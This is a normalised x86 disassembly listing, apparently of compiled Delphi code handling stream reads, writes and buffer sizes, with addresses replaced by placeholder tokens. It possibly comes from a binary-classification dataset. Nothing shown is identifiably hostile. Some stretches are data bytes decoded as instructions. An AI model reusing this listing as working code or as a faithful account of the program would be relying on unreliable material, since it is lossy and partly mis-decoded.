mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_404544
jmp r-xdata
sub_46741c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467492
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ef8
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_4041b8
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467499
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_407d94
sub_4674a3
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x7de87443 ]
or al [ eax ]
add dh al
inc ebx
imul eax [ eax ] 0x408dc35b
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_4674e4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41ad98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_46752c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d1c0
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_41ab4c
sub_467584
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041b8
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_4675a8
sub_4675a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4677a8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4677af
lea eax [ ebp - 0x1c ]
call sub_403ef8
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_4168c4
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_467bdc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467729
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4168c4
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_416680
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460c24
mov edx esi
mov eax ebx
call sub_467b34
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_4632f0
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_460b70
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d1c0
retn
sub_4677b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4678da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408460
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_408d28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_416b14
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46787d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403124
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4678e1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f1c
retn
sub_4678ec
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_4675a8
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_467920
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467968
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_404204
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46796f
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_467977
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_467af6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_416680
mov eax esi
call sub_416660
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_467ad9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_467aba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4678ec
mov eax esi
call sub_416660
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ac1
lea eax [ ebp - 0xc ]
call sub_40d1c0
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_4675a8
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax esi
call sub_416660
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_4625c4
mov ebx eax
test ebx ebx
je r-xdata
sub_467b08
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_467b34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_4675a8
mov eax ebx
call sub_467bc0
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_4675a8
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_467bdc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_467c24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467caa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_403fe8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467cb1
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
sub_467cb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467d8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028e0
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_416d70
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467d94
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_467d9c
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_467de8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_467f10
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467ee6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_46741c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4041b8
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_464f20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467eed
lea eax [ ebp - 0x8 ]
call sub_40d1c0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404418
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_404204
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404418
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_407d5c
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_46741c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4041b8
cmp eax 0x4
jl r-xdata
sub_467f48
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_467bdc
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_467f90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46801c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_46802c
mov edx eax
mov eax edi
mov ecx esi
call sub_403fe8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468023
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
sub_468038
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028e0
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_468070
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468124
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_467f34
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46812b
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_468038
sub_468130
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_416d20
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_416d20
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_468168
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46818d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468194
retn
sub_468394
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4684fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x7c ]
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4661fc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46752c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x10 ]
mov dl 0x2
mov eax [ ebp - 0x4 ]
call sub_4637cc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor edx edx
push ebp
push sub_4684cf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468503
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_46850c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
push ebp
push sub_468552
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468559
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
retn
sub_468560
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466ca8
xor eax eax
mov [ esi + 0xbc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4685a0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_466d8c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_468608
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46862d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468634
retn
sub_468640
mov [ esi + 0x46 ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ esi + 0xc0046 ] es
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] dl
inc ebp
dec ecx
push esp
push 0x64616572
inc ebp
popad
je r-xdata
jo r-xdata
inc edx
popad
jae r-xdata
inc ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
xchg [ esi ] eax
inc eax
add [ eax ] al
add [ eax + ebp + 0x336c0041 ] al
inc eax
imul ebp [ edi + 0x6e ] 0x4686ec90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xchg [ esi ] al
or al 0x0
add [ eax ] al
inc eax
xchg [ esi ] al
insb
xor eax [ eax ]
js r-xdata
mov [ esi ] al
nop
mov [ esi ] al
push esp
mov [ esi ] es
xor [ esi + eax * 2 + 0x468c1c00 ] cl
add [ eax + 0x29 ] ch
inc eax
add [ edx + ecx * 4 ] cl
inc esi
add ah bl
mov al [ esi ]
cmp al 0x8b
inc esi
add [ eax - 0x74 ] cl
inc esi
add [ eax + ecx * 4 ] dl
inc esi
add [ esi ] cl
add [ eax ] al
